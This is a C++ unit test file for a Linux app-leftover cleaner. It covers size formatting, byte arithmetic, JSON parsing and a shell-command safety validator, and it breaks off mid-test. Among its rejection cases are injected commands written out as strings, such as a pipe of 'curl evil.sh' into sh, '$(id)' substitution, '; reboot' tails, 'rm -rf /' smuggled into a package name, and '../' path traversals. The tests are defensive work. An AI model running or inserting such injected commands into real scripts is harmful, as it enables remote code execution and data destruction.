// Helper coverage for finding.cpp and diskusage.cpp. These tests need no scan
// and no wasm host, so they run in their own binary instead of inside the
// shipped Qt app (scripts/linux-qt-link.sh runs both).
#include "diskusage.h"
#include "finding.h"
#include "settings.h"

#include <QAtomicInt>
#include <QDate>
#include <QDateTime>
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QLocale>
#include <QSet>
#include <QSettings>
#include <QString>
#include <QStringList>
#include <QTemporaryDir>
#include <QTime>
#include <QTimeZone>
#include <QVector>

#include <cstddef>
#include <cstdio>
#include <cstring>
#include <limits>

static int verifyHelpers() {
    // Sizes and counts print the locale's separators and digits, so the
    // expected strings are built the same way instead of hardcoding "." and
    // ASCII digits.
    const QString dot = QString(QLocale().decimalPoint());
    if (humanSize(0) != localeCount(0) + QLatin1String(" B")) {
        std::fprintf(stderr, "humanSize(0) mismatch\n");
        return 1;
    }
    if (humanSize(1024) != QStringLiteral("1") + dot + QLatin1String("0 KB")) {
        std::fprintf(stderr, "humanSize(1024) mismatch\n");
        return 1;
    }
    if (humanSize(1048525) != QStringLiteral("1") + dot + QLatin1String("0 MB")) {
        std::fprintf(stderr, "humanSize(1048525) should bump 1024.0 KB to 1.0 MB\n");
        return 1;
    }
    if (humanSize(1023 * 1024) != QStringLiteral("1023") + dot + QLatin1String("0 KB")) {
        std::fprintf(stderr, "humanSize(1023 KiB) mismatch\n");
        return 1;
    }
    if (humanSize(std::numeric_limits<qint64>::max())
        != QStringLiteral("8") + dot + QLatin1String("0 EB")) {
        std::fprintf(stderr, "humanSize(qint64 max) should read as 8.0 EB, not 8192.0 PB\n");
        return 1;
    }
    // Whole bytes keep the locale's grouping, so 1023 reads "1.023 B" in
    // German rather than the C locale's "1023 B". 1023 is the largest count
    // that stays in the byte unit, and the one a single-file leftover hits.
    if (humanSize(1023) != localeCount(1023) + QLatin1String(" B")) {
        std::fprintf(stderr, "humanSize(1023) lost the locale grouping\n");
        return 1;
    }
    // A volume row's three columns have to add up. `bytesFree` counts the
    // blocks ext4 reserves for root and `bytesAvailable` does not, so using
    // the larger one for "used" makes a 100 GB volume with 5 GB reserved read
    // 51 GB used beside 44 GB available.
    if (volumeUsedBytes(Q_INT64_C(107374182400), Q_INT64_C(48234418176)) != Q_INT64_C(59139764224)) {
        std::fprintf(stderr, "volumeUsedBytes should subtract available, not free\n");
        return 1;
    }
    if (volumeUsedBytes(Q_INT64_C(107374182400), Q_INT64_C(107374182400)) != 0) {
        std::fprintf(stderr, "an empty volume has nothing used\n");
        return 1;
    }
    if (volumeUsedBytes(Q_INT64_C(107374182400), -1) != Q_INT64_C(107374182400)) {
        std::fprintf(stderr, "a volume that reports no free space is all used\n");
        return 1;
    }
    if (volumeUsedBytes(0, 0) != 0) {
        std::fprintf(stderr, "a volume of unknown size has nothing used\n");
        return 1;
    }
    // Byte totals saturate. The walk saturates each node, so one node can
    // already hold qint64 max and a plain `+=` of a second one is signed
    // overflow: a negative total, which then prints as a negative size and
    // scales a treemap by a negative area.
    if (addSatBytes(Q_INT64_C(1), Q_INT64_C(2)) != Q_INT64_C(3)) {
        std::fprintf(stderr, "addSatBytes should add a measured size\n");
        return 1;
    }
    if (addSatBytes(std::numeric_limits<qint64>::max(), Q_INT64_C(1))
        != std::numeric_limits<qint64>::max()) {
        std::fprintf(stderr, "addSatBytes should saturate instead of overflowing\n");
        return 1;
    }
    if (addSatBytes(Q_INT64_C(10), std::numeric_limits<qint64>::max())
        != std::numeric_limits<qint64>::max()) {
        std::fprintf(stderr, "addSatBytes should saturate from either side\n");
        return 1;
    }
    // -1 is how this host spells "not measured", not an amount, so it is
    // skipped rather than subtracting from the total, and a negative running
    // total restarts at zero when a measured size arrives.
    if (addSatBytes(Q_INT64_C(5), -1) != Q_INT64_C(5)) {
        std::fprintf(stderr, "an unmeasured size should not subtract\n");
        return 1;
    }
    if (addSatBytes(-1, Q_INT64_C(7)) != Q_INT64_C(7)) {
        std::fprintf(stderr, "a measured size should replace an unmeasured total\n");
        return 1;
    }
    QVector<Finding> largeSize;
    appendFindingsFromBlob(largeSize, QByteArrayLiteral(
        "{\"findings\":[{\"name\":\"large\",\"size_bytes\":9007199254740993}]}"));
    if (largeSize.size() != 1 || largeSize[0].bytes != Q_INT64_C(9007199254740993)) {
        std::fprintf(stderr, "64-bit JSON integer lost precision\n");
        return 1;
    }
    QVector<Finding> invalidSize;
    appendFindingsFromBlob(invalidSize, QByteArrayLiteral(
        "{\"findings\":[{\"name\":\"invalid\",\"size_bytes\":\"not-a-number\"}]}"));
    if (invalidSize.size() != 1 || invalidSize[0].bytes != -1) {
        std::fprintf(stderr, "invalid JSON integer treated as zero\n");
        return 1;
    }
    if (!isProtectedPackagedPath(QStringLiteral("/usr/bin/python3"))) {
        std::fprintf(stderr, "isProtectedPackagedPath missed /usr\n");
        return 1;
    }
    if (isProtectedPackagedPath(QStringLiteral("/home/u/gone-app"))) {
        std::fprintf(stderr, "isProtectedPackagedPath over-matched a home path\n");
        return 1;
    }
    /* rm resolves `..`, so a path that walks out of the tree the prefix test
       approved deletes a packaged root. */
    if (!isProtectedPackagedPath(QStringLiteral("/home/u/gone/../../../etc"))) {
        std::fprintf(stderr, "isProtectedPackagedPath accepted a parent traversal\n");
        return 1;
    }
    {
        Finding trav;
        trav.status = QStringLiteral("orphaned");
        trav.kind = QStringLiteral("config");
        trav.plugin = QStringLiteral("path-home-dot");
        trav.path = QStringLiteral("/home/u/gone/../../../etc");
        if (leftoverCleanupCommand(trav).contains(QLatin1String("rm "))) {
            std::fprintf(stderr, "leftoverCleanupCommand removed a parent traversal\n");
            return 1;
        }
    }
    {
        Finding ppa;
        ppa.status = QStringLiteral("orphaned");
        ppa.kind = QStringLiteral("ppa");
        ppa.plugin = QStringLiteral("apt");
        ppa.path = QStringLiteral("/etc/apt/sources.list.d/vendor.list");
        ppa.extraPaths = QStringList{QStringLiteral("/etc/apt/sources.list.d/../sources.list.d/evil.list")};
        const QString cmd = leftoverCleanupCommand(ppa);
        if (!cmd.contains(QLatin1String("vendor.list"))) {
            std::fprintf(stderr, "leftoverCleanupCommand dropped the ppa row\n");
            return 1;
        }
        if (cmd.contains(QLatin1String("evil.list"))) {
            std::fprintf(stderr, "leftoverCleanupCommand kept a ppa parent traversal\n");
            return 1;
        }
    }

    Finding f;
    f.path = QString::fromUtf8("/tmp/Cafe\xCC\x81");
    QSet<QString> ignored;
    ignored.insert(pathIdentityKey(QString::fromUtf8("/tmp/Caf\xC3\xA9")));
    if (!leftoverIsIgnored(f, ignored)) {
        std::fprintf(stderr, "leftoverIsIgnored NFC/NFD mismatch\n");
        return 1;
    }
    // A decomposed path off an exFAT/NTFS share must still match a
    // precomposed query typed into the search box.
    Finding searched;
    searched.name = QString::fromUtf8("Cafe\xCC\x81 Player");
    if (!searchHaystack(searched).contains(searchFold(QString::fromUtf8("caf\xC3\xA9")))) {
        std::fprintf(stderr, "searchHaystack misses an NFD name for an NFC query\n");
        return 1;
    }
    if (searchHaystack(searched).contains(searchFold(QStringLiteral("cafe")))) {
        std::fprintf(stderr, "searchHaystack folded a diacritic away\n");
        return 1;
    }
    if (searchFold(QStringLiteral("IINA")) != QLatin1String("iina")) {
        std::fprintf(stderr, "searchFold did not lowercase ASCII\n");
        return 1;
    }
    if (scriptHasCommands(QStringLiteral("#!/bin/sh\nset -e\n# comment\n"))) {
        std::fprintf(stderr, "scriptHasCommands preamble-only should be empty\n");
        return 1;
    }
    if (!scriptHasCommands(QStringLiteral("#!/bin/sh\nset -e\nrm -rf /tmp/x\n"))) {
        std::fprintf(stderr, "scriptHasCommands missed rm\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("apt-get purge -y wget"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a plain command\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -rf '/home/user/App Support/x'"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a quoted path with a space\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -f '/home/user/o'\\''brien'"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected an embedded quote\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("npm -g uninstall x; reboot #"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected command\n");
        return 1;
    }
    if (!commandIsShellSafe(QStringLiteral("rm -rf 'x'\\''; reboot; '\\'''"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a shellQuote-escaped name\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("rm -rf /tmp/x\ncurl evil.sh | sh"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a newline and a pipe\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral("rm -rf $(id)"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a command substitution\n");
        return 1;
    }
    if (commandIsShellSafe(QString())) {
        std::fprintf(stderr, "commandIsShellSafe accepted an empty command\n");
        return 1;
    }
    // A guarded removal is the app's own structure; both halves still have to
    // pass the byte check, or a second run would abort the script.
    if (!commandIsShellSafe(QStringLiteral(
            "if apt-get --version >/dev/null 2>&1; then apt-get purge -y wget; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a guarded removal\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in a guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x; reboot >/dev/null 2>&1; then rm -rf /tmp/x; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected query in a guard\n");
        return 1;
    }
    // The action is judged between `; then` and the last `; fi`, so a tail
    // after that `; fi` is not part of either half and would run unjudged.
    if (commandIsShellSafe(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi; reboot"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted a command after the guard\n");
        return 1;
    }
    if (parseGuardedRemove(
            QStringLiteral("if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi; reboot"))) {
        std::fprintf(stderr, "parseGuardedRemove took a line with a tail for a guard\n");
        return 1;
    }
    if (!parseGuardedRemove(QStringLiteral(
            "if test -e /tmp/x >/dev/null 2>&1; then rm -rf /tmp/x; fi"))) {
        std::fprintf(stderr, "parseGuardedRemove rejected a plain guard\n");
        return 1;
    }
    // The row guard filters a listing inside the guard, so npm, pnpm, bun,
    // pipx and uv removals reach the script in this shape.
    if (!commandIsShellSafe(QStringLiteral(
            "if npm ls -g --depth=0 | grep -qF -- 'left-pad@1.3.0'; then "
            "npm uninstall -g left-pad; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a row guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if npm ls -g | grep -qF -- 'x'; then npm uninstall -g x; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in a row guard\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if npm ls -g | grep -qF -- 'x' ; reboot; then npm uninstall -g x; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected query in a row guard\n");
        return 1;
    }
    // The pacman-family upgrade is guarded on the manager's own update query,
    // so a script that runs twice does not reinstall. Same wrapper shape as a
    // guarded removal, so it has to be accepted the same way.
    if (!commandIsShellSafe(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe rejected a guarded upgrade\n");
        return 1;
    }
    if (commandIsShellSafe(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; reboot; fi"))) {
        std::fprintf(stderr, "commandIsShellSafe accepted an injected action in an upgrade guard\n");
        return 1;
    }
    if (!commandNeedsRoot(QStringLiteral(
            "if pacman -Qu vim >/dev/null 2>&1; then pacman --noconfirm -S vim; fi"))) {
        std::fprintf(stderr, "commandNeedsRoot lost the action inside an upgrade guard\n");
        return 1;
    }
    if (!QFile::exists(QStringLiteral(":/icons/appattic.png"))) {
        std::fprintf(stderr, "icon: embedded :/icons/appattic.png missing\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("pacman")) != QLatin1String("Checking pacman packages")) {
        std::fprintf(stderr, "pluginScanLabel: pacman\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("aur")) != QLatin1String("Checking AUR packages")) {
        std::fprintf(stderr, "pluginScanLabel: aur\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("leftover-sizes"))
        != QLatin1String("Measuring leftover sizes")) {
        std::fprintf(stderr, "pluginScanLabel: leftover-sizes\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("path_home_dot"))
        != QLatin1String("Scanning leftover data in the home folder")) {
        std::fprintf(stderr, "pluginScanLabel: path_home_dot underscore\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("path-shadow")) != QLatin1String("Scanning PATH overlays")) {
        std::fprintf(stderr, "pluginScanLabel: path-shadow\n");
        return 1;
    }
    if (!pluginScanLabel(QStringLiteral("container-runtime")).contains(QLatin1String("container"))) {
        std::fprintf(stderr, "pluginScanLabel: container-runtime\n");
        return 1;
    }
    if (pluginScanLabel(QStringLiteral("deno")) != QLatin1String("Checking Deno global installs")) {
        std::fprintf(stderr, "pluginScanLabel: deno\n");
        return 1;
    }

    if (!outdatedIsUpdatable(QStringLiteral("apt"), QString())
        || !outdatedIsUpdatable(QStringLiteral("pacman"), QString())
        || !outdatedIsUpdatable(QStringLiteral("aur"), QString())
        || !outdatedIsUpdatable(QStringLiteral("dnf"), QString())
        || !outdatedIsUpdatable(QStringLiteral("yum"), QString())
        || !outdatedIsUpdatable(QStringLiteral("zypper"), QString())) {
        std::fprintf(stderr, "outdatedIsUpdatable: named distro upgrades must be updatable\n");
        return 1;
    }
    if (outdatedIsUpdatable(QStringLiteral("pip"), QString())
        || outdatedIsUpdatable(QStringLiteral("snapd"), QString())
        || outdatedIsUpdatable(QStringLiteral("brew-cask"), QStringLiteral("untrusted"))) {
        std::fprintf(stderr, "outdatedIsUpdatable: report-only manager or untrusted cask\n");
        return 1;
    }
    if (outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("unused-runtime"))
        || outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("orphan"))) {
        std::fprintf(stderr,
            "outdatedIsUpdatable: non-outdated kind must not inherit an update action\n");
        return 1;
    }
    if (!outdatedIsUpdatable(QStringLiteral("brew-formula"), QString())
        || !outdatedIsUpdatable(QStringLiteral("brew-cask"), QString())
        || !outdatedIsUpdatable(QStringLiteral("flatpak"), QString())
        || !outdatedIsUpdatable(QStringLiteral("flatpak"), QStringLiteral("outdated"))) {
        std::fprintf(stderr, "outdatedIsUpdatable: brew/flatpak must be updatable\n");
        return 1;
    }

    QVector<Finding> rows;
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"git\",\"name\":\"git\","
        "\"current_version\":\"1.0\",\"latest_version\":\"2.0\","
        "\"status\":\"outdated\",\"updatable\":false,"
        "\"command\":\"apt install --only-upgrade git\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1 || !isOutdated(rows[0]) || rows[0].updatable
        || canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: apt status=outdated must not override updatable:false\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"wget\",\"name\":\"wget\","
        "\"status\":\"outdated\",\"updatable\":true,"
        "\"command\":\"brew upgrade wget\",\"manager\":\"brew-formula\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable || !canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: brew-formula with updatable:true\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"untrusted\",\"id\":\"sketchy\",\"name\":\"sketchy\","
        "\"status\":\"outdated\",\"updatable\":true,\"manager\":\"brew-cask\"}]}"));
    if (rows.size() != 1 || rows[0].updatable || canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: untrusted must win over updatable:true\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"git\",\"name\":\"git\","
        "\"status\":\"outdated\",\"updatable\":true,"
        "\"command\":\"apt install --only-upgrade git\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable
        || rows[0].updateCommand != QLatin1String("apt install --only-upgrade git")
        || !canMarkCleanup(rows[0], Page::Outdated)) {
        std::fprintf(stderr, "updatable: apt command must become the update action\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"pacman\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"vim\",\"name\":\"vim\","
        "\"status\":\"outdated\",\"manager\":\"pacman\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable) {
        std::fprintf(stderr, "updatable: omitted updatable should follow manager pacman\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"brew\",\"findings\":[{"
        "\"kind\":\"outdated\",\"id\":\"cask\",\"name\":\"cask\","
        "\"status\":\"outdated\",\"manager\":\"brew-cask\"}]}"));
    if (rows.size() != 1 || !rows[0].updatable) {
        std::fprintf(stderr, "updatable: omitted updatable should follow manager brew-cask\n");
        return 1;
    }

    // A plugin note is the only signal that a row's list is short of the
    // machine: a command that did not answer, or more rows than the plugin's
    // table holds. A per-row reason must not bury it, because the user
    // confirms a deletion from this list.
    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"note\":\"1 list hit the row limit: more rows exist than were shown\","
        "\"dialog\":{\"title\":\"Remove apt orphans?\",\"body\":\"Named autoremove leaves only.\"},"
        "\"findings\":[{\"kind\":\"orphan\",\"id\":\"libfoo\",\"name\":\"libfoo\","
        "\"status\":\"orphaned\",\"manager\":\"apt\","
        "\"reason\":\"nothing needs it any more\"}]}"));
    if (rows.size() != 1
        || !rows[0].dialogBody.contains(QLatin1String("hit the row limit"))) {
        std::fprintf(stderr, "note: a truncated list must reach the row despite its reason\n");
        return 1;
    }

    rows.clear();
    appendFindingsFromBlob(rows, QByteArrayLiteral(
        "{\"plugin\":\"apt\",\"dialog\":{\"title\":\"t\",\"body\":\"Named autoremove leaves only.\"},"
        "\"findings\":[{\"kind\":\"orphan\",\"id\":\"libfoo\",\"name\":\"libfoo\","
        "\"status\":\"orphaned\",\"manager\":\"apt\"}]}"));
    if (rows.size() != 1
        || rows[0].dialogBody.contains(QLatin1String("Scan incomplete"))) {
        std::fprintf(stderr, "note: a complete scan must not claim to be incomplete\n");
        return 1;
    }

    Finding leftover;
    leftover.plugin = QStringLiteral("path-home-dot");
    leftover.status = QStringLiteral("orphaned");
    leftover.kind = QStringLiteral("dir");
    leftover.path = QStringLiteral("/home/alice/.config/gone-app");
    leftover.extraPaths << QStringLiteral("/home/alice/.local/share/gone-app")
                        << QStringLiteral("/usr/share/gone-app");
    const QString rm = leftoverCleanupCommand(leftover);
    if (!rm.contains(QLatin1String("rm -rf ")) || !rm.contains(QLatin1Char('\''))
        || rm.contains(QLatin1String("rm -rf /home/alice"))
        || !rm.contains(QLatin1String("'/home/alice/.local/share/gone-app'"))
        || rm.contains(QLatin1String("/usr/share"))) {
        std::fprintf(stderr, "leftoverCleanupCommand: path leftover must be quoted rm -rf including extraPaths\n");
        return 1;
    }
    if (!canMarkCleanup(leftover, Page::Leftovers)) {
        std::fprintf(stderr, "canMarkCleanup: leftover row must be markable for the list tickbox\n");
        return 1;
    }
    // A name from a registry, a tap, or the scan cache: a leading `-` reaches
    // the manager as an option, so mark-manual has to refuse it rather than
    // quote it into a different command.
    Finding option;
    option.manager = QStringLiteral("apt");
    option.kind = QStringLiteral("orphan");
    option.name = QStringLiteral("--set-priority=install");
    if (!markManualCommand(option).isEmpty()) {
        std::fprintf(stderr, "markManualCommand: a leading dash must be refused\n");
        return 1;
    }
    Finding named;
    named.manager = QStringLiteral("apt");
    named.kind = QStringLiteral("orphan");
    named.name = QStringLiteral("libfoo");
    if (markManualCommand(named) != QStringLiteral("apt-mark manual 'libfoo'")) {
        std::fprintf(stderr, "markManualCommand: a real name must still be scripted\n");
        return 1;
    }
    Finding ppa;
    ppa.kind = QStringLiteral("ppa");
    ppa.status = QStringLiteral("review");
    ppa.path = QStringLiteral("/etc/apt/sources.list.d/deadsnakes-ubuntu-ppa-noble.list");
    const QString ppaRm = leftoverCleanupCommand(ppa);
    if (!ppaRm.contains(QLatin1String("rm -f "))
        || !ppaRm.contains(QLatin1String("'/etc/apt/sources.list.d/deadsnakes-ubuntu-ppa-noble.list'"))
        || !commandNeedsRoot(ppaRm)
        || !withRootCmd(ppaRm).startsWith(QLatin1String("rootcmd "))) {
        std::fprintf(stderr, "leftoverCleanupCommand: PPA source must be quoted rm -f after confirm\n");
        return 1;
    }
    if (!commandNeedsRoot(QStringLiteral("apt-get -y install --only-upgrade git"))
        || !commandNeedsRoot(QStringLiteral("pacman --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("paru --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("yay --noconfirm -S vim"))
        || !commandNeedsRoot(QStringLiteral("snap remove hello"))
        || commandNeedsRoot(QStringLiteral("rm -rf '/home/alice/.config/gone-app'"))
        || commandNeedsRoot(QStringLiteral("pip uninstall -y --user httpie"))
        || commandNeedsRoot(QStringLiteral("rm -rf '/home/alice/etc/apt/sources.list.d/x.list'"))) {
        std::fprintf(stderr, "commandNeedsRoot: distro/AUR/snap yes, user leftover/pip no\n");
        return 1;
    }
    // A guarded removal is judged on its action, not on the leading `if`, and
    // the escalation goes inside the guard: `rootcmd if ...; then ...; fi`
    // stops parsing.
    const QString snapGuarded =
        QStringLiteral("if snap list hello >/dev/null 2>&1; then snap remove hello; fi");
    if (!commandNeedsRoot(snapGuarded)
        || withRootCmd(snapGuarded)
               != QStringLiteral("if snap list hello >/dev/null 2>&1; then rootcmd snap remove hello; fi")
        || commandNeedsRoot(withRootCmd(snapGuarded))
        || commandNeedsRoot(QStringLiteral("if flatpak info org.mozilla.Firefox >/dev/null 2>&1; then flatpak uninstall -y org.mozilla.Firefox; fi"))) {
        std::fprintf(stderr, "commandNeedsRoot: guarded removal judged on its action\n");
        return 1;
    }
    // A comment names a path the way a command does and runs nothing.
    if (commandNeedsRoot(QStringLiteral("# skipped packaged path '/etc/apt/sources.list.d/x.list'"))
        || !withRootCmd(QStringLiteral("# skipped packaged path '/etc/apt/sources.list.d/x.list'"))
                .startsWith(QLatin1Char('#'))) {
        std::fprintf(stderr, "commandNeedsRoot: a comment line never escalates\n");
        return 1;
    }
    Finding keepRm;
    keepRm.plugin = QStringLiteral("path-xdg-config");
    keepRm.kind = QStringLiteral("orphan-dir");
    keepRm.status = QStringLiteral("keep");
    keepRm.path = QStringLiteral("/home/alice/.mozilla");
    if (!leftoverCleanupCommand(keepRm).isEmpty()) {
        std::fprintf(stderr, "leftoverCleanupCommand: keep leftover must not emit rm\n");
        return 1;
    }
    Finding infixPpa;
    infixPpa.plugin = QStringLiteral("path-xdg-config");
    infixPpa.kind = QStringLiteral("orphan-dir");
    infixPpa.status = QStringLiteral("orphaned");
    infixPpa.path = QStringLiteral("/etc/foo/etc/apt/sources.list.d/x.list");
    if (!leftoverCleanupCommand(infixPpa).isEmpty()) {
        std::fprintf(stderr, "leftoverCleanupCommand: infix sources.list.d is not a PPA file\n");
        return 1;
    }
    Finding pkg;
    pkg.kind = QStringLiteral("orphan");
    pkg.name = QStringLiteral("libfoo0");
    pkg.command = QStringLiteral("apt-get purge -y libfoo0");
    pkg.children << QStringLiteral("libbar1");
    const QString childCmd = packageChildCommand(pkg, QStringLiteral("libbar1"));
    if (childCmd != QLatin1String("apt-get purge -y 'libbar1'")) {
        std::fprintf(stderr, "packageChildCommand: expected quoted child target (%s)\n",
            childCmd.toUtf8().constData());
        return 1;
    }
    if (!packageChildCommand(pkg, QStringLiteral("libbar1; rm -rf /")).isEmpty()) {
        std::fprintf(stderr, "packageChildCommand: metacharacters in child name\n");
        return 1;
    }
    QVector<Finding> grouped;
    Finding a;
    a.plugin = QStringLiteral("path-xdg-config");
    a.kind = QStringLiteral("orphan-dir");
    a.status = QStringLiteral("orphaned");
    a.name = QStringLiteral("gone-app");
    a.path = QStringLiteral("/home/alice/.config/gone-app");
    a.bytes = 10;
    Finding b;
    b.plugin = QStringLiteral("path-xdg-cache");
    b.kind = QStringLiteral("orphan-dir");
    b.status = QStringLiteral("orphaned");
    b.name = QStringLiteral("gone-app");
    b.path = QStringLiteral("/home/alice/.cache/gone-app");
    b.bytes = 20;
    grouped << a << b;
    groupLinuxLeftovers(grouped);
    if (grouped.size() != 1 || grouped[0].extraPaths.size() != 1
        || grouped[0].bytes != 30) {
        std::fprintf(stderr, "groupLinuxLeftovers: same-name leftovers must merge extraPaths\n");
        return 1;
    }
    QVector<Finding> keepGroup;
    Finding keepFx;
    keepFx.plugin = QStringLiteral("path-home-dot");
    keepFx.kind = QStringLiteral("orphan-dir");
    keepFx.status = QStringLiteral("keep");
    keepFx.name = QStringLiteral(".mozilla");
    keepFx.path = QStringLiteral("/home/alice/.mozilla");
    Finding orphanFx;
    orphanFx.plugin = QStringLiteral("path-xdg-config");
    orphanFx.kind = QStringLiteral("orphan-dir");
    orphanFx.status = QStringLiteral("orphaned");
    orphanFx.name = QStringLiteral("firefox");
    orphanFx.path = QStringLiteral("/home/alice/.config/firefox");
    keepGroup << keepFx << orphanFx;
    groupLinuxLeftovers(keepGroup);
    if (keepGroup.size() != 2) {
        std::fprintf(stderr, "groupLinuxLeftovers: keep leftover must not merge into an orphan\n");
        return 1;
    }
    QVector<Finding> aliasGroup;
    Finding moz;
    moz.plugin = QStringLiteral("path-home-dot");
    moz.kind = QStringLiteral("orphan-dir");
    moz.status = QStringLiteral("orphaned");
    moz.name = QStringLiteral(".mozilla");
    moz.path = QStringLiteral("/home/alice/.mozilla");
    moz.bytes = 5;
    Finding fx;
    fx.plugin = QStringLiteral("path-xdg-config");
    fx.kind = QStringLiteral("orphan-dir");
    fx.status = QStringLiteral("orphaned");
    fx.name = QStringLiteral("firefox");
    fx.path = QStringLiteral("/home/alice/.config/firefox");
    fx.bytes = 7;
    aliasGroup << moz << fx;
    groupLinuxLeftovers(aliasGroup);
    if (aliasGroup.size() != 1 || aliasGroup[0].extraPaths.size() != 1) {
        std::fprintf(stderr, "groupLinuxLeftovers: firefox/mozilla orphans must merge\n");
        return 1;
    }
    Finding snapOrphan;
    snapOrphan.plugin = QStringLiteral("snapd");
    snapOrphan.kind = QStringLiteral("orphan-dir");
    snapOrphan.path = QStringLiteral("/home/alice/snap/gone-app");
    const QString snapRm = leftoverCleanupCommand(snapOrphan);
    if (!snapRm.contains(QLatin1String("rm -rf ")) || !snapRm.contains(QLatin1Char('\''))) {
        std::fprintf(stderr, "leftoverCleanupCommand: snap orphan-dir must be quoted rm -rf\n");
        return 1;
    }
    QSet<QString> desks;
    desks.insert(QStringLiteral("firefox"));
    desks.insert(QStringLiteral("code"));
    if (!leftoverNameMatchesDesktop(QStringLiteral("firefox"), desks)
        || !leftoverNameMatchesDesktop(QStringLiteral("Code"), desks)
        || !leftoverNameMatchesDesktop(QStringLiteral(".mozilla"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("gone-app"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("firefox-esr"), desks)
        || leftoverNameMatchesDesktop(QStringLiteral("git"), desks)) {
        std::fprintf(stderr, "leftoverNameMatchesDesktop: installed desktop stem matching\n");
        return 1;
    }
    if (matchPage(leftover, Page::DiskUsage) || !matchPage(leftover, Page::Leftovers)) {
        std::fprintf(stderr, "disk: leftover must not appear on Disk Usage\n");
        return 1;
    }
    {
        QTemporaryDir tmp;
        if (!tmp.isValid()) {
            std::fprintf(stderr, "leftover size: temp dir failed\n");
            return 1;
        }
        const QString dir = tmp.path() + QStringLiteral("/gone-app");
        if (!QDir().mkpath(dir)) {
            std::fprintf(stderr, "leftover size: mkpath failed\n");
            return 1;
        }
        QFile f(dir + QStringLiteral("/data.bin"));
        if (!f.open(QIODevice::WriteOnly) || f.write(QByteArray(4096, 'x')) != 4096) {
            std::fprintf(stderr, "leftover size: write failed\n");
            return 1;
        }
        f.close();
        Finding sized;
        sized.plugin = QStringLiteral("path-xdg-config");
        sized.kind = QStringLiteral("orphan-dir");
        sized.status = QStringLiteral("orphaned");
        sized.path = dir;
        QVector<Finding> one;
        one << sized;
        enrichLeftoverSizes(one);
        if (one[0].bytes < 4096) {
            std::fprintf(stderr, "leftover size: expected measured bytes, got %lld\n",
                static_cast<long long>(one[0].bytes));
            return 1;
        }
        QVector<Finding> many;
        for (int i = 0; i < 8; ++i) {
            const QString sub = tmp.path() + QStringLiteral("/gone-%1").arg(i);
            if (!QDir().mkpath(sub)) {
                std::fprintf(stderr, "leftover size: parallel mkpath failed\n");
                return 1;
            }
            QFile part(sub + QStringLiteral("/data.bin"));
